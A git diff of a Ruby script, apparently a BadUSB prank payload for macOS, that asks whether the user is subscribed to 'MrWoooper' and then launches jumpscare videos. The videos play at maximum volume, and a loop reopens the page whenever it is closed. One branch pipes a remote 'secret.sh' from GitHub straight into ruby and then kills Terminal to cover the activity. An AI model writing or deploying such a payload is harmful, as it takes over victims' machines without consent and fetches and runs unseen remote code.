@@ -30,15 +30,6 @@ def set_volume_to_max
   end
 end
 
-# --- Brightness Control: Set Display Brightness to Maximum ---
-def set_brightness_to_max
-  if system("command -v brightness > /dev/null 2>&1")
-    system("brightness 1")
-  else
-    puts "Brightness control not available or 'brightness' utility not installed."
-  end
-end
-
 # --- Create Temporary HTML for Jumpscare ---
 def create_jumpscare_html(video_url)
   html_content = <<-HTML
@@ -82,7 +73,6 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Persistent Jumpscare Mode ---
-# Opens the jumpscare page in Safari and continually checks if the page is open.
 def persistent_jumpscare(video_url)
   html_file = create_jumpscare_html(video_url)
   
@@ -90,12 +80,10 @@ def persistent_jumpscare(video_url)
     set_volume_to_max
     # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Hide Safari's front window.
+    # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + 0.25 extra).
+    # Wait 0.75 seconds (0.5 + 0.25 extra) before unhiding.
     sleep 0.75
-    # Set brightness to maximum.
-    set_brightness_to_max
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
@@ -114,6 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
+    # If not found (i.e. if the page was closed), the loop will re-open it.
     sleep 3
   end
 end
@@ -123,41 +112,47 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Main Program Flow ---
+# --- Subscriber Action ---
+# Now includes four options: "Sydney lover", "Hawk", "Tuah", and "Girl Power!"
+def subscriber_action(choice)
+  ch = choice.strip.downcase
+  case ch
+  when "hawk"
+    run_secret_script
+    system("killall Terminal")
+    exit 0
+  when "tuah"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  when "sydney lover"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+  when "girl power!", "girl power", "girlpower"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+  else
+    puts "Unexpected button choice: #{choice}"
+  end
+end
 
-# First prompt: "Are you subscribed to MrWoooper?"
+# --- Main Program Flow ---
 subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
-puts "DEBUG: First prompt answer: #{subscribed.inspect}"  # Debug output
 if subscribed.nil?
   puts "No response received. Exiting."
   exit 0
 end
 
-if subscribed.strip.downcase == "no"
-  # Non-subscriber branch.
+if subscribed.downcase == "no"
+  # Non-subscriber branch: Immediately play jumpscare using jumpscare2.mp4.
   sleep 1
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
+  # (Persistent loop does not exit; Terminal kill not reached in this branch.)
 else
-  # Subscriber branch: Show a dialog with four buttons.
+  # Subscriber branch: Display a dialog with four buttons.
   button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah", "Girl Power!"], "Hawk")
   if button_choice.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
-  button_choice = button_choice.strip.downcase
-  case button_choice
-  when "hawk"
-    run_secret_script
-  when "tuah"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  when "sydney lover"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-  when /girl\s*power/
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-  else
-    puts "Unexpected button choice: #{button_choice}"
-  end
+  subscriber_action(button_choice)
   system("killall Terminal")
   exit 0
 end
